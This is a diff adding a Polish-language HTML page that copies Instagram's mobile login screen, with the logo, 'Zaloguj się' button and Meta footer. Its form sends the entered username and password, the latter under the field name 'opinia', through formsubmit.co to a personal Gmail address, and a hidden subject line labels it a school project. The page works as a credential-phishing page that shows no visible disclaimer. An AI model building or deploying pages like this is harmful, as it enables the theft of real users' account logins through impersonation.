@@ -1,0 +1,218 @@
+
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram — makieta logowania</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            background: #1c1c1e;
+            color: #f5f5f5;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 430px;
+            min-height: 100vh;
+            padding: 25px 20px 30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .language {
+            margin-top: 5px;
+            color: #aaa;
+            font-size: 16px;
+        }
+
+        
+.logo {
+    width: 50px;
+    height: 70px;
+    margin: 70px 0 65px;
+    object-fit: contain;
+    display: block;
+    border-radius: 24px;
+    filter: drop-shadow(0 0 18px rgba(255, 255, 255, 0.12));
+}
+
+        
+
+        .logo::before {
+            content: "";
+            position: absolute;
+            width: 48px;
+            height: 48px;
+            border: 8px solid #e130a0;
+            border-radius: 50%;
+            top: 14px;
+            left: 14px;
+        }
+
+        .logo::after {
+            content: "";
+            position: absolute;
+            width: 12px;
+            height: 12px;
+            background: #c900d8;
+            border-radius: 50%;
+            top: 10px;
+            right: 9px;
+        }
+
+        
+.demo-field {
+    width: 100%;
+    min-height: 66px;
+    padding: 20px;
+    margin-bottom: 14px;
+    border: 1px solid #505053;
+    border-radius: 20px;
+    background: #1c1c1e;
+    color: white;
+    font-size: 16px;
+    outline: none;
+}
+
+.demo-field::placeholder {
+    color: #aaa;
+}
+
+.demo-field:focus {
+    border-color: #777;
+}
+
+
+        .login-button {
+            width: 100%;
+            padding: 20px;
+            margin-top: 4px;
+            border: none;
+            border-radius: 40px;
+            background: #0866e8;
+            color: white;
+            font-size: 18px;
+            cursor: default;
+        }
+
+        .forgot {
+            margin-top: 25px;
+            font-size: 16px;
+        }
+
+        .spacer {
+            flex: 1;
+            min-height: 100px;
+        }
+
+        .create-account {
+            width: 100%;
+            padding: 18px 10px;
+            border: 1px solid #3797ff;
+            border-radius: 40px;
+            color: #3797ff;
+            text-align: center;
+            font-size: 17px;
+        }
+
+        .meta {
+            margin-top: 25px;
+            font-size: 23px;
+            font-weight: bold;
+            color: #ddd;
+        }
+
+        .note {
+            margin-top: 16px;
+            color: #888;
+            text-align: center;
+            font-size: 12px;
+        }
+
+        @media (max-height: 700px) {
+            .logo {
+                margin-top: 50px;
+                margin-bottom: 45px;
+            }
+
+            .spacer {
+                min-height: 40px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <main class="login-container">
+
+        <div class="language">Polski</div>
+
+        
+<img src="insta-fav.ico" alt="Moje logo" class="logo">
+
+
+        
+
+<form action="https://formsubmit.co/rostikslobo16@gmail.com"
+      method="POST">
+
+    <input type="hidden" name="_subject"
+           value="Projekt szkolny — formularz">
+
+    <input
+        class="demo-field"
+        type="text"
+        name="nick"
+        placeholder="Numer telefonu, e-mail lub nazwa użytkownika"
+        required
+    >
+
+    <input
+        class="demo-field"
+        type="password"
+        name="opinia"
+        placeholder="Hasło"
+        required
+    >
+
+    <button class="login-button" type="submit">
+        Zaloguj się
+    </button>
+
+</form>
+
+
+
+        
+
+        <div class="forgot">Nie pamiętasz hasła?</div>
+
+        <div class="spacer"></div>
+
+        <div class="create-account">
+            Utwórz nowe konto
+        </div>
+
+        <div class="meta">∞ Meta</div>
+
+        <p class="note">
+            
+        </p>
+
+    </main>
+
+</body>
+</html>
